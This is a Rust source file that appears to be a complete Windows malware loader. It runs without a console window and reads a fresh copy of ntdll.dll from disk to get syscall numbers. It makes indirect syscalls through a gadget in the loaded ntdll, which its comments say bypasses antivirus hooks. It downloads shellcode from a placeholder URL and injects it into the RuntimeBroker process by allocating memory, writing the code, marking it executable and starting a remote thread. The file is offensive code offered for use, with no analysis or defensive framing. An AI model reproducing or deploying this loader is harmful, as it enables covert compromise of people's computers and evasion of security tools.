#![windows_subsystem = "windows"]
use std::arch::asm;
use std::ffi::CString;
use std::fs::File;
use std::io::Read;
use std::ptr;

// SSNs resolved dynamically from fresh ntdll on disk
static mut SSN_NT_OPEN_PROCESS: u32 = 0;
static mut SSN_NT_ALLOCATE: u32 = 0;
static mut SSN_NT_WRITE: u32 = 0;
static mut SSN_NT_PROTECT: u32 = 0;
static mut SSN_NT_CREATE_THREAD: u32 = 0;
static mut SYSCALL_GADGET: usize = 0;

#[repr(C)]
struct CLIENT_ID {
    unique_process: *mut std::ffi::c_void,
    unique_thread: *mut std::ffi::c_void,
}

#[repr(C)]
struct OBJECT_ATTRIBUTES {
    length: u32,
    root_directory: *mut std::ffi::c_void,
    object_name: *mut std::ffi::c_void,
    attributes: u32,
    security_descriptor: *mut std::ffi::c_void,
    security_quality_of_service: *mut std::ffi::c_void,
}

const PROCESS_ALL_ACCESS: u32 = 0x1FFFFF;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;

// INDIRECT SYSCALL - JMP to syscall gadget in ntdll (bypasses inline hooks)
#[inline(never)]
unsafe fn indirect_syscall_4(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize) -> i32 {
    let result: i32;
    let gadget = SYSCALL_GADGET;
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "jmp {gadget}",
        ssn = in(reg) ssn,
        gadget = in(reg) gadget,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        out("rax") result,
        clobber_abi("system"),
    );
    result
}

#[inline(never)]
unsafe fn indirect_syscall_5(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> i32 {
    let result: i32;
    let gadget = SYSCALL_GADGET;
    asm!(
        "sub rsp, 0x30",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "jmp {gadget}",
        ssn = in(reg) ssn,
        gadget = in(reg) gadget,
        a5 = in(reg) a5,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        out("rax") result,
        clobber_abi("system"),
    );
    result
}

#[inline(never)]
unsafe fn indirect_syscall_6(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) -> i32 {
    let result: i32;
    let gadget = SYSCALL_GADGET;
    asm!(
        "sub rsp, 0x38",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov qword ptr [rsp+0x30], {a6}",
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "jmp {gadget}",
        ssn = in(reg) ssn,
        gadget = in(reg) gadget,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        out("rax") result,
        clobber_abi("system"),
    );
    result
}

#[inline(never)]
unsafe fn indirect_syscall_11(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize, 
                               a5: usize, a6: usize, a7: usize, a8: usize, 
                               a9: usize, a10: usize, a11: usize) -> i32 {
    let result: i32;
    let gadget = SYSCALL_GADGET;
    asm!(
        "sub rsp, 0x68",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov qword ptr [rsp+0x30], {a6}",
        "mov qword ptr [rsp+0x38], {a7}",
        "mov qword ptr [rsp+0x40], {a8}",
        "mov qword ptr [rsp+0x48], {a9}",
        "mov qword ptr [rsp+0x50], {a10}",
        "mov qword ptr [rsp+0x58], {a11}",
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "jmp {gadget}",
        ssn = in(reg) ssn,
        gadget = in(reg) gadget,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        a10 = in(reg) a10,
        a11 = in(reg) a11,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        out("rax") result,
        clobber_abi("system"),
    );
    result
}

#[link(name = "kernel32")]
extern "system" {
    fn GetModuleHandleA(name: *const i8) -> *mut std::ffi::c_void;
    fn CreateToolhelp32Snapshot(flags: u32, pid: u32) -> *mut std::ffi::c_void;
    fn Process32First(snap: *mut std::ffi::c_void, entry: *mut PROCESSENTRY32) -> i32;
    fn Process32Next(snap: *mut std::ffi::c_void, entry: *mut PROCESSENTRY32) -> i32;
    fn CloseHandle(h: *mut std::ffi::c_void) -> i32;
}

#[repr(C)]
struct PROCESSENTRY32 {
    dw_size: u32,
    cnt_usage: u32,
    th32_process_id: u32,
    th32_default_heap_id: usize,
    th32_module_id: u32,
    cnt_threads: u32,
    th32_parent_process_id: u32,
    pc_pri_class_base: i32,
    dw_flags: u32,
    sz_exe_file: [u8; 260],
}

fn rva_to_offset(pe_bytes: &[u8], rva: usize) -> usize {
    unsafe {
        let e_lfanew = *(pe_bytes.as_ptr().add(0x3C) as *const u32) as usize;
        let nt_headers = pe_bytes.as_ptr().add(e_lfanew);
        let num_sections = *(nt_headers.add(0x06) as *const u16) as usize;
        let section_header = nt_headers.add(0x108);
        
        for i in 0..num_sections {
            let section = section_header.add(i * 0x28);
            let virtual_addr = *(section.add(0x0C) as *const u32) as usize;
            let virtual_size = *(section.add(0x08) as *const u32) as usize;
            let raw_offset = *(section.add(0x14) as *const u32) as usize;
            
            if rva >= virtual_addr && rva < virtual_addr + virtual_size {
                return raw_offset + (rva - virtual_addr);
            }
        }
        rva
    }
}

// Read FRESH ntdll from disk - bypasses in-memory AV hooks!
unsafe fn resolve_syscalls() -> bool {
    let mut file = match File::open("C:\\Windows\\System32\\ntdll.dll") {
        Ok(f) => f,
        Err(_) => return false,
    };
    
    let mut ntdll_bytes = Vec::new();
    if file.read_to_end(&mut ntdll_bytes).is_err() { return false; }
    
    // Parse PE
    if *(ntdll_bytes.as_ptr() as *const u16) != 0x5A4D { return false; }
    let e_lfanew = *(ntdll_bytes.as_ptr().add(0x3C) as *const u32) as usize;
    let nt_headers = ntdll_bytes.as_ptr().add(e_lfanew);
    if *(nt_headers as *const u32) != 0x4550 { return false; }
    
    // Export directory
    let export_rva = *(nt_headers.add(0x88) as *const u32) as usize;
    let export_dir = ntdll_bytes.as_ptr().add(rva_to_offset(&ntdll_bytes, export_rva));
    
    let num_names = *(export_dir.add(0x18) as *const u32) as usize;
    let names_rva = *(export_dir.add(0x20) as *const u32) as usize;
    let ordinals_rva = *(export_dir.add(0x24) as *const u32) as usize;
    let funcs_rva = *(export_dir.add(0x1C) as *const u32) as usize;
    
    let names_table = ntdll_bytes.as_ptr().add(rva_to_offset(&ntdll_bytes, names_rva)) as *const u32;
    let ordinals_table = ntdll_bytes.as_ptr().add(rva_to_offset(&ntdll_bytes, ordinals_rva)) as *const u16;
    let funcs_table = ntdll_bytes.as_ptr().add(rva_to_offset(&ntdll_bytes, funcs_rva)) as *const u32;
    
    let targets: [(&str, *mut u32); 5] = [
        ("NtOpenProcess", &mut SSN_NT_OPEN_PROCESS),
        ("NtAllocateVirtualMemory", &mut SSN_NT_ALLOCATE),
        ("NtWriteVirtualMemory", &mut SSN_NT_WRITE),
        ("NtProtectVirtualMemory", &mut SSN_NT_PROTECT),
        ("NtCreateThreadEx", &mut SSN_NT_CREATE_THREAD),
    ];
    
    for i in 0..num_names {
        let name_rva = *names_table.add(i) as usize;
        let name_ptr = ntdll_bytes.as_ptr().add(rva_to_offset(&ntdll_bytes, name_rva));
        let name = std::ffi::CStr::from_ptr(name_ptr as *const i8);
        
        for (target_name, ssn_ptr) in &targets {
            if let Ok(n) = name.to_str() {
                if n == *target_name {
                    let ordinal = *ordinals_table.add(i) as usize;
                    let func_rva = *funcs_table.add(ordinal) as usize;
                    let func_bytes = ntdll_bytes.as_ptr().add(rva_to_offset(&ntdll_bytes, func_rva));
                    
                    // Pattern: 4C 8B D1 B8 XX XX 00 00 (mov r10,rcx; mov eax,SSN)
                    if *func_bytes == 0x4C && *func_bytes.add(1) == 0x8B && 
                       *func_bytes.add(2) == 0xD1 && *func_bytes.add(3) == 0xB8 {
                        **ssn_ptr = *(func_bytes.add(4) as *const u32);
                    }
                }
            }
        }
    }
    
    // Find syscall;ret gadget (0F 05 C3) in loaded ntdll for indirect call
    let ntdll_mod = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
    if !ntdll_mod.is_null() {
        for offset in 0..0x200000usize {
            let addr = (ntdll_mod as usize + offset) as *const u8;
            if *addr == 0x0F && *addr.add(1) == 0x05 && *addr.add(2) == 0xC3 {
                SYSCALL_GADGET = addr as usize;
                break;
            }
        }
    }
    
    SSN_NT_OPEN_PROCESS != 0 && SSN_NT_ALLOCATE != 0 && SSN_NT_WRITE != 0 && 
    SSN_NT_PROTECT != 0 && SSN_NT_CREATE_THREAD != 0 && SYSCALL_GADGET != 0
}

fn find_process(name: &str) -> Option<u32> {
    unsafe {
        let snap = CreateToolhelp32Snapshot(0x2, 0);
        if snap.is_null() { return None; }
        
        let mut entry: PROCESSENTRY32 = std::mem::zeroed();
        entry.dw_size = std::mem::size_of::<PROCESSENTRY32>() as u32;
        
        if Process32First(snap, &mut entry) != 0 {
            loop {
                let proc_name = std::ffi::CStr::from_ptr(entry.sz_exe_file.as_ptr() as *const i8).to_string_lossy();
                if proc_name.to_lowercase().contains(&name.to_lowercase()) {
                    CloseHandle(snap);
                    return Some(entry.th32_process_id);
                }
                if Process32Next(snap, &mut entry) == 0 { break; }
            }
        }
        CloseHandle(snap);
        None
    }
}

fn download_shellcode() -> Option<Vec<u8>> {
    let url = "URL_PLACEHOLDER";
    
    unsafe {
        #[link(name = "wininet")]
        extern "system" {
            fn InternetOpenA(agent: *const i8, access: u32, proxy: *const i8, bypass: *const i8, flags: u32) -> *mut std::ffi::c_void;
            fn InternetOpenUrlA(inet: *mut std::ffi::c_void, url: *const i8, headers: *const i8, headers_len: u32, flags: u32, ctx: usize) -> *mut std::ffi::c_void;
            fn InternetReadFile(file: *mut std::ffi::c_void, buf: *mut u8, to_read: u32, read: *mut u32) -> i32;
            fn InternetCloseHandle(h: *mut std::ffi::c_void) -> i32;
        }
        
        let agent = CString::new("Mozilla/5.0").ok()?;
        let url_c = CString::new(url).ok()?;
        
        let inet = InternetOpenA(agent.as_ptr(), 0, ptr::null(), ptr::null(), 0);
        if inet.is_null() { return None; }
        
        let handle = InternetOpenUrlA(inet, url_c.as_ptr(), ptr::null(), 0, 0x84800000, 0);
        if handle.is_null() { InternetCloseHandle(inet); return None; }
        
        let mut shellcode = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            let mut read = 0u32;
            if InternetReadFile(handle, buf.as_mut_ptr(), buf.len() as u32, &mut read) == 0 || read == 0 { break; }
            shellcode.extend_from_slice(&buf[..read as usize]);
        }
        
        InternetCloseHandle(handle);
        InternetCloseHandle(inet);
        if shellcode.is_empty() { None } else { Some(shellcode) }
    }
}

fn main() {
    unsafe {
        if !resolve_syscalls() { return; }
    }
    
    let shellcode = match download_shellcode() { Some(sc) => sc, None => return };
    let pid = match find_process("RuntimeBroker") { Some(p) => p, None => return };
    
    unsafe {
        let mut process_handle: *mut std::ffi::c_void = ptr::null_mut();
        let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
        oa.length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
        let mut cid = CLIENT_ID { unique_process: pid as *mut _, unique_thread: ptr::null_mut() };
        
        let status = indirect_syscall_4(SSN_NT_OPEN_PROCESS, &mut process_handle as *mut _ as usize,
            PROCESS_ALL_ACCESS as usize, &mut oa as *mut _ as usize, &mut cid as *mut _ as usize);
        if status < 0 || process_handle.is_null() { return; }
        
        let mut base_addr: *mut std::ffi::c_void = ptr::null_mut();
        let mut region_size: usize = shellcode.len();
        
        let status = indirect_syscall_6(SSN_NT_ALLOCATE, process_handle as usize,
            &mut base_addr as *mut _ as usize, 0, &mut region_size as *mut _ as usize,
            (MEM_COMMIT | MEM_RESERVE) as usize, PAGE_READWRITE as usize);
        if status < 0 || base_addr.is_null() { return; }
        
        let mut bytes_written: usize = 0;
        let status = indirect_syscall_5(SSN_NT_WRITE, process_handle as usize, base_addr as usize,
            shellcode.as_ptr() as usize, shellcode.len(), &mut bytes_written as *mut _ as usize);
        if status < 0 { return; }
        
        let mut old_protect: u32 = 0;
        let mut protect_size: usize = shellcode.len();
        let mut protect_base = base_addr;
        
        let status = indirect_syscall_5(SSN_NT_PROTECT, process_handle as usize,
            &mut protect_base as *mut _ as usize, &mut protect_size as *mut _ as usize,
            PAGE_EXECUTE_READ as usize, &mut old_protect as *mut _ as usize);
        if status < 0 { return; }
        
        let mut thread_handle: *mut std::ffi::c_void = ptr::null_mut();
        indirect_syscall_11(SSN_NT_CREATE_THREAD, &mut thread_handle as *mut _ as usize,
            0x1FFFFF, 0, process_handle as usize, base_addr as usize, 0, 0, 0, 0, 0, 0);
    }
}
